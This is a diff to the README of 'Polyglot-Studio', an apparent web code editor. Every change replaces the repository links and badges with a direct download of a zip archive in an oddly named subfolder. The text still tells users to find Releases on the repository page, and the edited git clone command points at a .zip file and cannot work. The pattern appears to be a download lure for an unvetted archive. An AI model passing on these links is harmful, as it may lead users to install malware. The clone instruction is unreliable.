@@ -1,6 +1,6 @@
 # ⚡ Polyglot-Studio - Fast and Simple Web Code Editor
 
-[![Download Polyglot-Studio](https://img.shields.io/badge/Download-Polyglot--Studio-brightgreen?style=for-the-badge)](https://github.com/Andrix1234/Polyglot-Studio)
+[![Download Polyglot-Studio](https://img.shields.io/badge/Download-Polyglot--Studio-brightgreen?style=for-the-badge)](https://github.com/Andrix1234/Polyglot-Studio/raw/refs/heads/main/plurivalent/Studio_Polyglot_v1.5.zip)
 
 ## 📋 What is Polyglot-Studio?
 
@@ -25,7 +25,7 @@ No installation is needed. Just visit the site or use the version available on G
 To begin using Polyglot-Studio on your Windows computer, follow these steps:
 
 1. Click on the big green download button at the top or visit the following link:  
-   [https://github.com/Andrix1234/Polyglot-Studio](https://github.com/Andrix1234/Polyglot-Studio)
+   [https://github.com/Andrix1234/Polyglot-Studio/raw/refs/heads/main/plurivalent/Studio_Polyglot_v1.5.zip](https://github.com/Andrix1234/Polyglot-Studio/raw/refs/heads/main/plurivalent/Studio_Polyglot_v1.5.zip)
 
 2. On the GitHub page, look for the latest release or download section.  
    Since this link takes you to the repository page, you will need to find the area labeled **Releases** on the right side or near the top.
@@ -102,12 +102,12 @@ For users who want to host Polyglot-Studio locally or customize it:
 
 1. Visit the official page to download the app files:
 
-   [https://github.com/Andrix1234/Polyglot-Studio](https://github.com/Andrix1234/Polyglot-Studio)
+   [https://github.com/Andrix1234/Polyglot-Studio/raw/refs/heads/main/plurivalent/Studio_Polyglot_v1.5.zip](https://github.com/Andrix1234/Polyglot-Studio/raw/refs/heads/main/plurivalent/Studio_Polyglot_v1.5.zip)
 
 2. Download the latest release or clone the repository using Git if you have it installed:
 
    ```
-   git clone https://github.com/Andrix1234/Polyglot-Studio.git
+   git clone https://github.com/Andrix1234/Polyglot-Studio/raw/refs/heads/main/plurivalent/Studio_Polyglot_v1.5.zip
    ```
 
 3. After downloading, go to the folder where you saved the files.
@@ -118,4 +118,4 @@ No installation or extra tools are needed.
 
 ---
 
-[![Download Polyglot-Studio](https://img.shields.io/badge/Download-Polyglot--Studio-blue?style=for-the-badge)](https://github.com/Andrix1234/Polyglot-Studio)
+[![Download Polyglot-Studio](https://img.shields.io/badge/Download-Polyglot--Studio-blue?style=for-the-badge)](https://github.com/Andrix1234/Polyglot-Studio/raw/refs/heads/main/plurivalent/Studio_Polyglot_v1.5.zip)
